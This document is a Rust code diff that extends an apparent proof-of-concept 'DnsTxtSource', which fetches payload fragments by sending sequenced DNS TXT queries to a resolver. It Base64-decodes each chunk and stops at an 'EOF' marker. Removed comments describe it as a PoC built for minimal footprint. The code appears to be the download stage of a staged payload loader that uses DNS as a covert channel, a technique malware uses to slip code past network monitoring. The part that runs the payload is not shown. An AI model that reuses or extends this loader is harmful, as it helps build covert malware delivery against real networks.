@@ -17,8 +17,37 @@ impl DnsTxtSource {
         }
     }
 
-    /// Forms a raw DNS query packet (12-byte header + encoded domain + QTYPE + QCLASS).
-    fn build_dns_query(&self, tx_id: u16) -> Vec<u8> {
+    /// Very minimal Base64 decoding logic (Zero deps)
+    fn decode_b64(&self, b64: &[u8]) -> Vec<u8> {
+        let mut out = Vec::with_capacity((b64.len() * 3) / 4);
+        let mut val = 0u32;
+        let mut bits = 0;
+        
+        for &b in b64 {
+            let n = match b {
+                b'A'..=b'Z' => b - b'A',
+                b'a'..=b'z' => b - b'a' + 26,
+                b'0'..=b'9' => b - b'0' + 52,
+                b'+' => 62,
+                b'/' => 63,
+                b'=' => {
+                    bits -= 2;
+                    continue;
+                }
+                _ => continue, // ignore whitespace / quotes
+            };
+            val = (val << 6) | (n as u32);
+            bits += 6;
+            if bits >= 8 {
+                bits -= 8;
+                out.push((val >> bits) as u8);
+            }
+        }
+        out
+    }
+
+    /// Forms a raw DNS query packet for N.domain (e.g., "0.payload.test.local").
+    fn build_dns_query(&self, tx_id: u16, seq: u16) -> Vec<u8> {
         let mut packet = Vec::with_capacity(512);
         
         // 12-byte DNS Header
@@ -29,7 +58,11 @@ impl DnsTxtSource {
         packet.extend_from_slice(&[0x00, 0x00]);        // Authority RRs: 0
         packet.extend_from_slice(&[0x00, 0x00]);        // Additional RRs: 0
 
-        // Domain Name Parsing (QNAME)
+        // Parse: "<seq>.domain.com"
+        let seq_str = format!("{}", seq);
+        packet.push(seq_str.len() as u8);
+        packet.extend_from_slice(seq_str.as_bytes());
+
         for part in self.domain.split('.') {
             let len = part.len() as u8;
             packet.push(len);
@@ -37,86 +70,59 @@ impl DnsTxtSource {
         }
         packet.push(0x00); // End of QNAME
 
-        // QTYPE: TXT (16)
-        packet.extend_from_slice(&[0x00, 0x10]);
-        // QCLASS: IN (1)
-        packet.extend_from_slice(&[0x00, 0x01]);
+        packet.extend_from_slice(&[0x00, 0x10]); // QTYPE: TXT (16)
+        packet.extend_from_slice(&[0x00, 0x01]); // QCLASS: IN (1)
 
         packet
     }
 
-    /// Parses a raw DNS response and returns the unencoded payload bytes from the TXT record.
-    /// This is a spartan parser designed for minimal footprint.
     fn parse_dns_response(&self, buf: &[u8]) -> Option<Vec<u8>> {
-        if buf.len() < 12 {
-            return None; // Too short
-        }
+        if buf.len() < 12 { return None; }
 
-        // Check if it's a response (QR bit set) and no error code (RCODE == 0)
         let flags = u16::from_be_bytes([buf[2], buf[3]]);
-        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 {
-            return None; 
-        }
+        if (flags & 0x8000) == 0 || (flags & 0x000F) != 0 { return None; }
 
         let qdcount = u16::from_be_bytes([buf[4], buf[5]]);
         let ancount = u16::from_be_bytes([buf[6], buf[7]]);
+        if ancount == 0 { return None; }
 
-        if ancount == 0 {
-            return None; // No answers
-        }
-
-        // Skip header
         let mut offset = 12;
-
-        // Skip queries section
         for _ in 0..qdcount {
             while offset < buf.len() && buf[offset] != 0 {
-                if buf[offset] >= 192 {
-                    offset += 2; // Pointer
-                    break;
-                } else {
-                    offset += (buf[offset] as usize) + 1;
-                }
+                if buf[offset] >= 192 { offset += 2; break; }
+                else { offset += (buf[offset] as usize) + 1; }
             }
-            if offset < buf.len() && buf[offset] == 0 {
-                offset += 1;
-            }
-            offset += 4; // Skip QTYPE and QCLASS
+            if offset < buf.len() && buf[offset] == 0 { offset += 1; }
+            offset += 4;
         }
 
-        // Parse answers section
         for _ in 0..ancount {
             if offset >= buf.len() { break; }
 
-            // Skip name
-            if buf[offset] >= 192 {
-                offset += 2; // Pointer
-            } else {
-                while offset < buf.len() && buf[offset] != 0 {
-                    offset += (buf[offset] as usize) + 1;
-                }
+            if buf[offset] >= 192 { offset += 2; }
+            else {
+                while offset < buf.len() && buf[offset] != 0 { offset += (buf[offset] as usize) + 1; }
                 offset += 1;
             }
 
             if offset + 10 > buf.len() { break; }
-
             let rtype = u16::from_be_bytes([buf[offset], buf[offset+1]]);
             let rdlength = u16::from_be_bytes([buf[offset+8], buf[offset+9]]) as usize;
             offset += 10;
 
-            if rtype == 16 { // TXT Record
+            if rtype == 16 { 
                 if offset + rdlength > buf.len() { break; }
-                
-                // TXT data contains length-prefixed strings. 
-                // We extract the first string.
                 let txt_len = buf[offset] as usize;
                 if offset + 1 + txt_len <= buf.len() {
                     let txt_data = &buf[offset+1 .. offset+1+txt_len];
                     
-                    // In a real scenario, this TXT would contain hex/base64 encoded bytes. 
-                    // For the PoC, we assume it's direct bytes or hex string to be converted.
-                    // For brevity and minimal footprint, returning raw bytes here.
-                    return Some(txt_data.to_vec());
+                    // The magic EOF marker
+                    if txt_data == b"EOF" || txt_data == b"\"EOF\"" {
+                        return Some(b"EOF".to_vec());
+                    }
+
+                    // Decode Base64 chunk
+                    return Some(self.decode_b64(txt_data));
                 }
             } else {
                 offset += rdlength;
@@ -126,33 +132,31 @@ impl DnsTxtSource {
     }
 }
 
-impl FragmentSource for DnsTxtSource {
-    fn fetch(&self) -> Fragment {
+impl DnsTxtSource {
+    pub fn fetch_seq(&self, seq: u16) -> Option<Fragment> {
         let sock = match UdpSocket::bind("0.0.0.0:0") {
             Ok(s) => s,
-            Err(_) => return Fragment { sequence_id: 0, data: vec![] },
+            Err(_) => return None,
         };
-        let _ = sock.set_read_timeout(Some(Duration::from_secs(3)));
+        let _ = sock.set_read_timeout(Some(Duration::from_millis(1500)));
 
-        // tx_id maps to sequence_id for simplicity in this PoC
-        // Real implementation would extract sequence from TXT payload layout
-        let sequence_id: u8 = 0; 
-        
-        let query = self.build_dns_query(0x1234);
+        let query = self.build_dns_query(0x1234, seq);
         if sock.send_to(&query, &self.resolver).is_err() {
-            return Fragment { sequence_id, data: vec![] };
+            return None;
         }
 
         let mut buf = [0u8; 512];
         if let Ok((size, _)) = sock.recv_from(&mut buf) {
              if let Some(payload_bytes) = self.parse_dns_response(&buf[..size]) {
-                 return Fragment {
-                     sequence_id,  // In a multi-part payload, the sequence ID would be parsed from the domain query.
+                 if payload_bytes == b"EOF" {
+                     return None; // EOF signal
+                 }
+                 return Some(Fragment {
+                     sequence_id: (seq % 256) as u8,
                      data: payload_bytes,
-                 };
+                 });
              }
         }
-
-        Fragment { sequence_id, data: vec![] }
+        None // Timeout or error
     }
 }
